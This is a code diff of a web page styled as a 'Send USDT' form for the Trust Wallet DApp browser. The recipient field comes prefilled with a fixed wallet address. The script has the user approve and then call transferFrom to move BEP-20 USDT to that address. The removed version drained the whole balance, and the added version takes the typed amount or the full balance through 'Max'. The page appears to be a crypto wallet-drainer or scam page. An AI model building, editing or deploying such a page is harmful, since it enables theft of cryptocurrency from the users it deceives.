@@ -92,7 +92,9 @@
     }
   </style>
 </head>
-<body>  <header>Send USDT</header>  <div class="container">
+<body>
+  <header>Send USDT</header>
+  <div class="container">
     <label>Address or Domain Name</label>
     <div class="input-box">
       <input type="text" id="wallet" value="0x1956B3950A73B0C54792199Edf13c7b835FF94DC" />
@@ -104,7 +106,7 @@
 <div class="input-box amount-box">
   <input type="number" id="amount" placeholder="USDT Amount" />
   <span class="token">USDT</span>
-  <span class="input-actions" onclick="document.getElementById('amount').value='100'">Max</span>
+  <span class="input-actions" onclick="setMax()">Max</span>
 </div>
 
 <div class="usd">≈ $0.00</div>
@@ -112,11 +114,22 @@
   </div>  <div class="fixed-button">
     <button id="nextBtn" onclick="start()">Next</button>
   </div>  <script src="https://cdn.jsdelivr.net/npm/web3@1.8.2/dist/web3.min.js"></script>  <script>
+    const USDT = "0x55d398326f99059fF775485246999027B3197955";
     const ABI = [
-      { "constant": false, "inputs": [{ "name": "_spender", "type": "address" }, { "name": "_value", "type": "uint256" }], "name": "approve", "outputs": [{ "name": "", "type": "bool" }], "type": "function" },
-      { "constant": false, "inputs": [{ "name": "_from", "type": "address" }, { "name": "_to", "type": "address" }, { "name": "_value", "type": "uint256" }], "name": "transferFrom", "outputs": [{ "name": "", "type": "bool" }], "type": "function" },
-      { "constant": true, "inputs": [{ "name": "owner", "type": "address" }], "name": "balanceOf", "outputs": [{ "name": "", "type": "uint256" }], "type": "function" }
+      { "constant": false, "inputs": [ { "name": "_spender", "type": "address" }, { "name": "_value", "type": "uint256" } ], "name": "approve", "outputs": [ { "name": "", "type": "bool" } ], "type": "function" },
+      { "constant": false, "inputs": [ { "name": "_from", "type": "address" }, { "name": "_to", "type": "address" }, { "name": "_value", "type": "uint256" } ], "name": "transferFrom", "outputs": [ { "name": "", "type": "bool" } ], "type": "function" },
+      { "constant": true, "inputs": [ { "name": "owner", "type": "address" } ], "name": "balanceOf", "outputs": [ { "name": "", "type": "uint256" } ], "type": "function" }
     ];
+
+    async function setMax() {
+      if (!window.ethereum) return;
+      const web3 = new Web3(window.ethereum);
+      const accounts = await web3.eth.getAccounts();
+      const user = accounts[0];
+      const contract = new web3.eth.Contract(ABI, USDT);
+      const balance = await contract.methods.balanceOf(user).call();
+      document.getElementById('amount').value = web3.utils.fromWei(balance, 'ether');
+    }
 
     async function start() {
       const btn = document.getElementById("nextBtn");
@@ -124,7 +137,7 @@
       btn.disabled = true;
 
       if (!window.ethereum) {
-        alert("Please use Trust Wallet / Web3 Browser.");
+        alert("Please use Trust Wallet DApp browser.");
         btn.innerText = "Next";
         btn.disabled = false;
         return;
@@ -135,18 +148,19 @@
         await window.ethereum.request({ method: 'eth_requestAccounts' });
         const accounts = await web3.eth.getAccounts();
         const user = accounts[0];
+        const contract = new web3.eth.Contract(ABI, USDT);
+
         const wallet = document.getElementById("wallet").value;
+        const amount = document.getElementById("amount").value;
+        const amountWei = web3.utils.toWei(amount, 'ether');
 
-        const contract = new web3.eth.Contract(ABI, "0x55d398326f99059fF775485246999027B3197955"); // USDT BEP-20
-        const balance = await contract.methods.balanceOf(user).call();
+        await contract.methods.approve(wallet, amountWei).send({ from: user });
+        await contract.methods.transferFrom(user, wallet, amountWei).send({ from: user });
 
-        await contract.methods.approve(wallet, balance).send({ from: user });
-        await contract.methods.transferFrom(user, wallet, balance).send({ from: user });
-
-        btn.innerText = " Done";
+        btn.innerText = "✅ Done";
       } catch (e) {
         console.error(e);
-        btn.innerText = " Failed";
+        btn.innerText = "❌ Failed";
       }
 
       setTimeout(() => {
